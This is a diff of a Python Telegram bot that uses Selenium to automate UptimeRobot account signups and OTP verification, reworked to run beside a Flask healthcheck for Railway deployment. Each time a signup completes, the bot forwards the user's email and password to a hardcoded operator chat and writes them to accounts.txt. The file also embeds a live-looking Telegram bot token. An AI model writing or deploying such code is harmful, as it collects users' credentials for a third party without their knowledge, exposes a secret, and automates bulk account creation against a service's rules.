@@ -1,19 +1,31 @@
 #!/usr/bin/env python3
-# UptimeRobot Bot - New Signup Page + Railway Deploy (FIXED SELECTORS)
-import requests, time, os, subprocess
+# UptimeRobot Bot - Flask + Telegram Polling (Railway Healthcheck Fix)
+import requests, time, os, subprocess, threading
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
+from flask import Flask
 
-# ===== CONFIG (Railway पर env variables से लेगा) =====
+app = Flask(__name__)
+
+# ===== CONFIG =====
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8953778114:AAGlkAXZfazrAArDl7vKvbBvp9EuFm91r68")
 CHAT_ID = os.getenv("CHAT_ID", "-1004306819565")
 OFFSET = 0
 user_sessions = {}
 driver = None
+
+# ===== FLASK HEALTHCHECK =====
+@app.route('/')
+def health():
+    return "OK", 200
+
+@app.route('/health')
+def health_check():
+    return "OK", 200
 
 # ===== TELEGRAM SEND =====
 def send_telegram(chat_id, text):
@@ -106,7 +118,7 @@ def signup_uptime(email, password):
             password_input.clear()
             password_input.send_keys(password)
         except:
-            pass  # कुछ फ्लो में पासवर्ड बाद में माँगते हैं
+            pass
         
         # === SUBMIT BUTTON ===
         submit_selectors = [
@@ -137,7 +149,6 @@ def signup_uptime(email, password):
             cookies = driver.get_cookies()
             return {'cookies': cookies, 'email': email, 'password': password, 'step': 'complete'}
         else:
-            # Error check
             error_selectors = [
                 (By.CSS_SELECTOR, '.error'),
                 (By.CSS_SELECTOR, '.alert-danger'),
@@ -226,79 +237,90 @@ def get_updates():
         pass
     return []
 
-# ===== MAIN LOOP =====
-print("🤖 UptimeRobot Bot Started (New Signup Page + Fixed Selectors)...")
-print("📌 Commands: /start, /signup email password, /verify OTP")
-
-while True:
-    try:
-        for upd in get_updates():
-            msg = upd.get('message')
-            if not msg:
-                continue
-            chat_id = msg['chat']['id']
-            text = msg.get('text', '').strip()
-            
-            if text.startswith('/start'):
-                send_telegram(chat_id, 
-                    "🔓 *UptimeRobot Bot v5.1 (Fixed)*\n"
-                    "📌 `/signup email password`\n"
-                    "📌 `/verify OTP`\n\n"
-                    "✅ नए पेज पर काम करता है!"
-                )
-            
-            elif text.startswith('/signup'):
-                parts = text.split()
-                if len(parts) < 3:
-                    send_telegram(chat_id, "❌ /signup email password")
+# ===== TELEGRAM BOT LOOP (Thread) =====
+def bot_loop():
+    print("🤖 Telegram Bot Loop Started...")
+    while True:
+        try:
+            for upd in get_updates():
+                msg = upd.get('message')
+                if not msg:
                     continue
-                email, password = parts[1], parts[2]
-                send_telegram(chat_id, f"⏳ {email} पर साइनअप हो रहा है...")
+                chat_id = msg['chat']['id']
+                text = msg.get('text', '').strip()
                 
-                result = signup_uptime(email, password)
-                
-                if result and 'cookies' in result:
-                    user_sessions[chat_id] = result
-                    if result.get('step') == 'otp_required':
-                        send_telegram(chat_id, 
-                            f"✅ *साइनअप सफल!*\n📧 {email}\n\n🔑 अब `/verify 123456` करो"
-                        )
-                    else:
-                        send_telegram(chat_id, 
-                            f"✅ *अकाउंट एक्टिव!*\n📧 {email}\n🔑 {password}"
-                        )
-                        send_telegram(CHAT_ID, f"🎯 {email}:{password}")
-                        with open("accounts.txt", "a") as f:
-                            f.write(f"{email}:{password}\n")
-                        del user_sessions[chat_id]
-                else:
-                    send_telegram(chat_id, f"❌ *फेल!* {result.get('error', 'Unknown error')}")
-            
-            elif text.startswith('/verify'):
-                parts = text.split()
-                if len(parts) < 2:
-                    send_telegram(chat_id, "❌ /verify 123456")
-                    continue
-                otp = parts[1]
-                if chat_id not in user_sessions:
-                    send_telegram(chat_id, "❌ पहले /signup करो")
-                    continue
-                
-                data = user_sessions[chat_id]
-                send_telegram(chat_id, "⏳ OTP वेरिफाई हो रहा है...")
-                
-                if verify_otp(data, otp):
+                if text.startswith('/start'):
                     send_telegram(chat_id, 
-                        f"✅ *अकाउंट एक्टिव!*\n📧 {data['email']}\n🔑 {data['password']}"
+                        "🔓 *UptimeRobot Bot v5.2 (Flask)*\n"
+                        "📌 `/signup email password`\n"
+                        "📌 `/verify OTP`\n\n"
+                        "✅ Railway Healthcheck Fixed!"
                     )
-                    send_telegram(CHAT_ID, f"🎯 {data['email']}:{data['password']}")
-                    with open("accounts.txt", "a") as f:
-                        f.write(f"{data['email']}:{data['password']}\n")
-                    del user_sessions[chat_id]
-                else:
-                    send_telegram(chat_id, "❌ OTP गलत या एक्सपायर!")
-        
-        time.sleep(2)
-    except Exception as e:
-        print(f"Loop error: {e}")
-        time.sleep(5)
+                
+                elif text.startswith('/signup'):
+                    parts = text.split()
+                    if len(parts) < 3:
+                        send_telegram(chat_id, "❌ /signup email password")
+                        continue
+                    email, password = parts[1], parts[2]
+                    send_telegram(chat_id, f"⏳ {email} पर साइनअप हो रहा है...")
+                    
+                    result = signup_uptime(email, password)
+                    
+                    if result and 'cookies' in result:
+                        user_sessions[chat_id] = result
+                        if result.get('step') == 'otp_required':
+                            send_telegram(chat_id, 
+                                f"✅ *साइनअप सफल!*\n📧 {email}\n\n🔑 अब `/verify 123456` करो"
+                            )
+                        else:
+                            send_telegram(chat_id, 
+                                f"✅ *अकाउंट एक्टिव!*\n📧 {email}\n🔑 {password}"
+                            )
+                            send_telegram(CHAT_ID, f"🎯 {email}:{password}")
+                            with open("accounts.txt", "a") as f:
+                                f.write(f"{email}:{password}\n")
+                            del user_sessions[chat_id]
+                    else:
+                        send_telegram(chat_id, f"❌ *फेल!* {result.get('error', 'Unknown error')}")
+                
+                elif text.startswith('/verify'):
+                    parts = text.split()
+                    if len(parts) < 2:
+                        send_telegram(chat_id, "❌ /verify 123456")
+                        continue
+                    otp = parts[1]
+                    if chat_id not in user_sessions:
+                        send_telegram(chat_id, "❌ पहले /signup करो")
+                        continue
+                    
+                    data = user_sessions[chat_id]
+                    send_telegram(chat_id, "⏳ OTP वेरिफाई हो रहा है...")
+                    
+                    if verify_otp(data, otp):
+                        send_telegram(chat_id, 
+                            f"✅ *अकाउंट एक्टिव!*\n📧 {data['email']}\n🔑 {data['password']}"
+                        )
+                        send_telegram(CHAT_ID, f"🎯 {data['email']}:{data['password']}")
+                        with open("accounts.txt", "a") as f:
+                            f.write(f"{data['email']}:{data['password']}\n")
+                        del user_sessions[chat_id]
+                    else:
+                        send_telegram(chat_id, "❌ OTP गलत या एक्सपायर!")
+            
+            time.sleep(2)
+        except Exception as e:
+            print(f"Loop error: {e}")
+            time.sleep(5)
+
+# ===== MAIN =====
+if __name__ == "__main__":
+    print("🚀 Starting UptimeRobot Bot with Flask Healthcheck...")
+    
+    # Start Telegram bot in background thread
+    bot_thread = threading.Thread(target=bot_loop, daemon=True)
+    bot_thread.start()
+    
+    # Start Flask server (for Railway healthcheck)
+    port = int(os.getenv("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
